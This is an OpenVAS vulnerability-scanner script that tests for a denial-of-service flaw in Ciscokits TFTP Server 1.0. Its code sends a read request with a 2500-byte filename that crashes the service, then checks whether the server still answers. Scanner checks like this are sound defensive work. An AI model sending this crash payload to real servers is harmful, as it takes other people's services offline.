###############################################################################
# OpenVAS Vulnerability Test
# $Id: secpod_ciscokits_tftp_server_dos_vuln.nasl 13202 2019-01-21 15:19:15Z cfischer $
#
# Ciscokits TFTP Server Long Filename Denial Of Service Vulnerability
#
# Authors:
# Antu Sanadi <santu@secpod.com>
#
# Copyright:
# Copyright (c) 2011 SecPod, http://www.secpod.com
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.902460");
  script_version("$Revision: 13202 $");
  script_tag(name:"last_modification", value:"$Date: 2019-01-21 16:19:15 +0100 (Mon, 21 Jan 2019) $");
  script_tag(name:"creation_date", value:"2011-07-27 14:47:11 +0200 (Wed, 27 Jul 2011)");
  script_tag(name:"cvss_base", value:"6.4");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:P/A:P");
  script_name("Ciscokits TFTP Server Long Filename Denial Of Service Vulnerability");

  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/17569/");
  script_xref(name:"URL", value:"http://packetstormsecurity.org/files/view/103321/ciscokits-dos.txt");

  script_category(ACT_DENIAL);
  script_copyright("Copyright (C) 2011 SecPod");
  script_family("Denial of Service");
  script_dependencies("tftpd_detect.nasl", "os_detection.nasl");
  script_require_udp_ports("Services/udp/tftp", 69);
  script_require_keys("tftp/detected", "Host/runs_windows");

  script_tag(name:"impact", value:"Successful exploitation will allow attackers to cause denial
  of service attacks.");

  script_tag(name:"affected", value:"Ciscokits TFTP Server version 1.0.");

  script_tag(name:"insight", value:"The flaw is due to an error when handling a long file name
  read request, which can be exploited by remote unauthenticated attackers to crash an affected application.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one.");

  script_tag(name:"summary", value:"This host is running Ciscokits TFTP Server and is prone to
  denial of service vulnerability.");

  script_tag(name:"solution_type", value:"WillNotFix");
  script_tag(name:"qod_type", value:"remote_vul");

  exit(0);
}

port = get_kb_item("Services/udp/tftp");
if(!port)
  port = 69;

if(!get_udp_port_state(port))
  exit(0);

soc = open_sock_udp(port);
if(!soc)
  exit(0);

request = raw_string(0x00, 0x01, 0x6d, 0x79, 0x74, 0x65, 0x73, 0x74,
                     0x2e, 0x74, 0x78, 0x74, 0x00, 0x6e, 0x65, 0x74,
                     0x61, 0x73, 0x63, 0x69, 0x69, 0x00);

send(socket:soc, data:request);
result = recv(socket:soc, length:100);
if(isnull(result) && "Not Found in local Storage" >!< result) {
  close(soc);
  exit(0);
}

attack = raw_string(0x00, 0x01) + crap(data:raw_string(0x41), length: 2500) +
         raw_string(0x00, 0x6e,0x65, 0x74, 0x61, 0x73, 0x63, 0x69, 0x69, 0x00);

send(socket:soc, data:attack);

request = raw_string(0x00, 0x01, 0x6d, 0x79, 0x74, 0x65, 0x73, 0x74,
                     0x2e, 0x74, 0x78, 0x74, 0x00, 0x6e, 0x65, 0x74,
                     0x61, 0x73, 0x63, 0x69, 0x69, 0x00);

send(socket:soc, data:request);
close(soc);

result = recv(socket:soc, length:100);
if(isnull(result) && "Not Found in local Storage" >!< result){
  security_message(port:port, proto:"udp");
  exit(0);
}

exit(99);